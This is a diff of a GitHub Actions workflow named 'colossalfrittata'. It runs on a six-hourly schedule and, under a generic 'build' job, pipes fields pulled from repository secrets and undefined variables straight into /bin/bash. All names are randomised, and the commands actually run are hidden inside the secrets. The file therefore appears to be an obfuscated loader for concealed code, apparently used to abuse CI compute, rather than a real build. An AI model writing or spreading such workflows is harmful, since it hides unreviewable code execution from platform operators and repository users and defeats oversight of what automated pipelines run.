@@ -1,29 +1,22 @@
 name: colossalfrittata
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 2/6 * * *'
-
+    - cron: '53 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: colossalfrittata
         env:
-          ekdb1: ${{ secrets.ekdb1 }}
+          jo55032: ${{ secrets.jo55032 }}
         run: |
-          echo $ekdb1 | jq -r .dqkjm20925 | /bin/bash
-          echo $go475 | jq -r .ytg56 | /bin/bash
-          echo $bcq6804 | jq -r .rx19063 | /bin/bash
-          echo $un93863 | jq -r .ntw0138 | /bin/bash
-          echo $qde0 | jq -r .lnx1816 | /bin/bash
-          echo $ipg0 | jq -r .rroa6121 | /bin/bash
-          echo $fdejt8 | jq -r .dvfq2527 | /bin/bash
-          echo $vfink695 | jq -r .cfx0538 | /bin/bash
-          echo $hzve5 | jq -r .vxz3253 | /bin/bash
-          echo $euuy69 | jq -r .xduaw0 | /bin/bash
-          echo $xa4277 | jq -r .qejl007 | /bin/bash
-          echo $ymy87876 | jq -r .ty205 | /bin/bash
+          echo $jo55032 | jq -r .hu43285 | /bin/bash
+          echo $ttb46306 | jq -r .db33355 | /bin/bash
+          echo $xf051 | jq -r .yrqqy38174 | /bin/bash
+          echo $p7635 | jq -r .ymeq786 | /bin/bash
+          echo $q8500 | jq -r .r106 | /bin/bash
+          echo $z71530 | jq -r .lkxn5 | /bin/bash
 
